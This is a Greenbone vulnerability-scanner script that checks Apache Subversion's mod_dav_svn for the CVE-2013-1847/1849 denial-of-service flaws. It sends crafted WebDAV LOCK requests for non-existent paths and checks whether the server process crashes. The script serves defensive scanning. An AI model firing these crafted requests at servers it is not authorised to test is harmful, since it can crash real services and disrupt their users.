# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802055");
  script_version("2024-01-26T05:05:14+0000");
  script_cve_id("CVE-2013-1847", "CVE-2013-1849");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2024-01-26 05:05:14 +0000 (Fri, 26 Jan 2024)");
  script_tag(name:"creation_date", value:"2013-06-11 12:32:36 +0530 (Tue, 11 Jun 2013)");
  script_name("Apache Subversion 'mod_dav_svn' Module Multiple DoS Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/52966/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58323");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58897");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Mar/56");
  script_xref(name:"URL", value:"http://subversion.apache.org/security/CVE-2013-1847-advisory.txt");
  script_xref(name:"URL", value:"http://subversion.apache.org/security/CVE-2013-1849-advisory.txt");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Apache_SVN/banner");

  script_tag(name:"affected", value:"Apache Subversion 1.6.x through 1.6.20 and 1.7.0 through 1.7.8");

  script_tag(name:"insight", value:"An error within the 'mod_dav_svn' module when handling

  - 'LOCK' requests against a URL for a non-existent path or invalid activity
    URL that supports anonymous locks.

  - 'PROPFIND' request on an activity URL.");

  script_tag(name:"solution", value:"Upgrade to Apache Subversion version 1.6.21 or 1.7.9 or later.");

  script_tag(name:"summary", value:"Apache Subversion is prone to multiple denial of service vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attackers to cause a segfault.

  NOTE : Configurations which allow anonymous read access to the repository
  will be vulnerable.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port: port);
if(!banner || banner !~ "Server\s*:\s*Apache.* SVN")
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

if(http_is_dead(port:port))
  exit(0);

# nb: LOCK request body
lock_body = string('<?xml version="1.0" encoding="UTF-8"?>\n',
                   "<D:lockinfo xmlns:D='DAV:'>\n",
                   '<D:lockscope><D:exclusive/></D:lockscope>\n',
                   '<D:locktype><D:write/></D:locktype>\n',
                   '<D:owner>\n',
                   '<D:href>http://test.test</D:href>\n',
                   '</D:owner>\n',
                   '</D:lockinfo>\n');

foreach dir(make_list_unique("/", "/repo", "/repository", "/trunk", "/svn",
                             "/svn/trunk", "/repo/trunk", "/repo/projects",
                             "/projects", "/svn/repos", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  url = dir + "/";
  req1 = http_get(item:url, port:port);
  res1 = http_keepalive_send_recv(port:port, data:req1);
  if(!res1 || res1 !~ "^HTTP/1\.[01] 200")
    continue;

  # nb: Send normal request and check for normal response to confirm. Subversion is working as expected.
  proper_path = string("LOCK ", url, " HTTP/1.1", "\r\n");
  common_req = string("User-Agent: ", useragent, "\r\n",
                      "Host: ", host, "\r\n",
                      "Accept: */*\r\n", "Content-Length: ",
                      strlen(lock_body), "\r\n\r\n", lock_body);

  normal_req = string(proper_path, common_req);
  normal_res = http_keepalive_send_recv(port:port, data:normal_req);
  if(normal_res =~ "^HTTP/1\.[01] 405")
    continue;

  # nb: non-existent path
  rand_path = rand_str(length:8);

  non_existant_path = string("LOCK ", url, rand_path, " HTTP/1.1", "\r\n");

  # nb: Some time Apache servers will re-spawn the listener processes. Send a non-existent path
  # and check for the response. If no response is received then a Segmentation fault occurred.
  crafted_req = string(non_existant_path, common_req);
  crafted_res = http_keepalive_send_recv(port:port, data:crafted_req);

  # nb: patched/non-vulnerable version repose HTTP/1.1 401 Authorization Required
  if(crafted_res =~ "^HTTP/1\.[01] 401")
    exit(0);

  # nb: Some times response has "\r\n" hence check strlen(crafted_res) < 3
  # nb: Trying 2 times to make sure module is crashing
  if(isnull(crafted_res) || strlen(crafted_res) < 3) {
    crafted_res = http_keepalive_send_recv(port:port, data:crafted_req);
    if(isnull(crafted_res) || strlen(crafted_res) < 3) {
      security_message(port:port);
      exit(0);
    }
  }

  # nb: If HTTP did not re-spawn the listener processes
  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
